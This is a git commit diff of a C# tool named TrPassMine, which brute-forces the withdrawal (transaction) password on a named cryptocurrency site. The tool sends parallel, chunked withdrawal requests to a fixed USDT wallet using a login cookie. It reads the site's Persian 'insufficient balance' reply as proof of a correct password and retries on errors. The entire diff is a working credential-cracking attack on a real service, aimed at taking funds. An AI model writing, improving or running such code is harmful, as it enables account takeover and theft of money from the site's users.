6a3d8407eb7490b6991a4f5efbf10745bd5b0d0a
a.rajabi <a.rajabi@dpkharazmi.com>
2024-02-17 13:05:28 +0330

    tr pass mine performance revise

--- TrPassMine/PassMine.cs
+++ TrPassMine/PassMine.cs
@@ -18,6 +18,22 @@ namespace TrPassMine
         private readonly string LoginCookie = ConfigurationManager.AppSettings["LoginCookie"];
         private readonly Uri baseaddress = new Uri("https://btcdsi.com");
         private readonly string targetUrl = "/index/withdraw/index.html";
+        private readonly HttpClient _client = null;
+        private readonly int UrlChunkCount = int.Parse(ConfigurationManager.AppSettings["RequestCountAtTime"]);
+        public PassMine()
+        {
+            var cookieContainer = new CookieContainer();
+            try
+            {
+                processCookie().ToList().ForEach(x => { cookieContainer.Add(baseaddress, new Cookie(x.Key, x.Value)); });
+            }
+            catch (Exception)
+            {
+                Console.WriteLine("error in parsing login cookie");
+            }
+            var handler = new HttpClientHandler() { CookieContainer = cookieContainer };
+            _client = new HttpClient(handler) { BaseAddress = baseaddress };
+        }
         private StringContent Serialize(object obj)
         {
             return new StringContent(JsonConvert.SerializeObject(obj), Encoding.UTF8, "application/json");
@@ -48,48 +64,42 @@ namespace TrPassMine
             try
             {
                 var passwords = GetPasswordsFromFile();
-                FrmModel model = new FrmModel() { money = 5, wallet_type = "trc20", usdt_wallet = WalletADDR };
-                long counter = 1;
+                List<FrmModel> reqs = new List<FrmModel>();
+                bool IsPasswordFound = false;
                 if (passwords != null)
                 {
-                    foreach (var pass in passwords)
+                    passwords.ForEach(x => { reqs.Add(new FrmModel() { money = 5, wallet_type = "trc20", usdt_wallet = WalletADDR, paypwd = x }); });
+                    Console.WriteLine("process is starting.please wait ...");
+                    for (int i = 0; i < reqs.Count/UrlChunkCount; i++)
                     {
-                        model.paypwd = pass;
-                        var cookieContainer = new CookieContainer();
-                        using (var handler = new HttpClientHandler() { CookieContainer = cookieContainer })
-                        using (HttpClient client = new HttpClient(handler) { BaseAddress = baseaddress })
+                        var reqChunk = reqs.Skip(i * UrlChunkCount).Take(UrlChunkCount).ToList();
+                        var requests = reqChunk.Select(r => _client.PostAsync(targetUrl, Serialize(r))).ToList();
+                        waitforResponse:
+                        try
                         {
-                            try
+                            await Task.WhenAll(requests);
+                            var responses = requests.Select(task => task.Result);
+                            foreach (var r in responses)
                             {
-                                processCookie().ToList().ForEach(x => { cookieContainer.Add(baseaddress, new Cookie(x.Key, x.Value)); });
-                            }
-                            catch (Exception)
-                            {
-                                Console.WriteLine("error in parsing login cookie");
-                                break;
-                            }
-                            var response = await client.PostAsync(targetUrl, Serialize(model));
-                            if (response.IsSuccessStatusCode)
-                            {
-                                var message = Deserialize<ResponseModel>(await response.Content.ReadAsStringAsync());
-                                var msgg = WebUtility.HtmlDecode(message.msg);
-                                if (msgg != " خطای کلمه عبور تراکنش ")
+                                if (ProcessResponse(r))
                                 {
-                                    if (msgg == "موجودی ناکافی")
-                                    {
-                                        Console.WriteLine($"{counter}) password : {pass}  -->  result : sucessfull!" + Environment.NewLine);
-                                        Console.WriteLine($"password is : {pass}");
-                                        break;
-                                    }
-                                    else
-                                        Console.WriteLine($"{counter}) password : {pass}  -->  result : unknown error");
+                                    Console.WriteLine($"password is : {await evokePassword(reqChunk)}");
+                                    IsPasswordFound = true;
+                                    break;
                                 }
-                                else
-                                    Console.WriteLine($"{counter}) password : {pass}  -->  result : tr password error");
                             }
                         }
-                        counter++;
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(ex.Message);
+                            Console.WriteLine("retry process started.please wait ...");
+                            goto waitforResponse;
+                        }
+                        Console.WriteLine($"{(i + 1) * UrlChunkCount}/{reqs.Count} password processed.please wait ...");
                     }
+                    if(!IsPasswordFound)
+                        Console.WriteLine("no password found.");
+                    Console.WriteLine("process is Done!");
                 }
                 else
                     Console.WriteLine("password file not found");
@@ -99,6 +109,35 @@ namespace TrPassMine
                 Console.WriteLine(ex.Message);
             }
             return "";
+        }
+        private Task<HttpResponseMessage> CallUrl(FrmModel model)
+        {
+            return _client.PostAsync(targetUrl, Serialize(model));
+        }
+        private bool ProcessResponse(HttpResponseMessage response)
+        {
+            bool result = false;
+            if (response.IsSuccessStatusCode)
+            {
+                var message = Deserialize<ResponseModel>(response.Content.ReadAsStringAsync().GetAwaiter().GetResult());
+                var msgg = WebUtility.HtmlDecode(message.msg);
+                if (msgg != " خطای کلمه عبور تراکنش ")
+                {
+                    if (msgg == "موجودی ناکافی")
+                        result = true;
+                }
+            }
+            return result;
+        }
+        private async Task<string> evokePassword(List<FrmModel> models)
+        {
+            string result = "";
+            foreach (var item in models)
+            {
+                if (ProcessResponse(await CallUrl(item)))
+                    result = item.paypwd;
+            }
+            return result;
         }
     }
     public class FrmModel
